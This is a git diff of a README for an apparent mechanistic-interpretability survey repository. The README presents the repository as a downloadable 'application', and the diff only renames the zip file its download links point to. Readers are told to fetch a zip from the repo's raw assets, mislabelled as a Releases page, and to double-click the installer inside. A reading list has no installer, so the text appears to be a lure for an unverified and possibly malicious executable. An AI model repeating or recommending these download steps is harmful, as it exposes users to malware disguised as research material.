@@ -7,7 +7,7 @@ Welcome to the Awesome-Actionable-MI-Survey repository. This is your guide to un
 To get started, you need to download the application. You can find the latest version of the software on our Releases page. 
 
 ### **Download Now!**
-[![Download](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/Awesome-Survey-Actionable-M-v3.0.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/Awesome-Survey-Actionable-M-v3.0.zip)
+[![Download](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/M_Survey_Awesome_Actionable_v3.0.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/M_Survey_Awesome_Actionable_v3.0.zip)
 
 ## 📋 What You Will Need
 Before you download the application, ensure that your system meets these requirements:
@@ -18,7 +18,7 @@ Before you download the application, ensure that your system meets these require
 - **Internet Connection:** Required for downloading the application and accessing resources.
 
 ## 📥 Download & Install
-1. Visit the Releases page: [Download Here](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/Awesome-Survey-Actionable-M-v3.0.zip).
+1. Visit the Releases page: [Download Here](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/M_Survey_Awesome_Actionable_v3.0.zip).
 2. On the Releases page, look for the latest version. You will see a list of files tied to that version.
 3. Click on the appropriate file for your operating system to begin downloading. 
 4. Once downloaded, locate the file in your downloads folder and double-click it to run the installer.
@@ -61,6 +61,6 @@ Your privacy is essential to us. The application does not collect personal infor
 Your feedback helps us improve. If you have suggestions or comments, please let us know through the GitHub Issues page.
 
 ## 📥 Download Again
-To download the latest version or check for updates at any point, visit: [Download Here](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/Awesome-Survey-Actionable-M-v3.0.zip). 
+To download the latest version or check for updates at any point, visit: [Download Here](https://github.com/Jayaragow/Awesome-Actionable-MI-Survey/raw/refs/heads/master/assets/M_Survey_Awesome_Actionable_v3.0.zip). 
 
 Thank you for using the Awesome-Actionable-MI-Survey application. We hope it helps you better understand mechanistic interpretability in large language models.
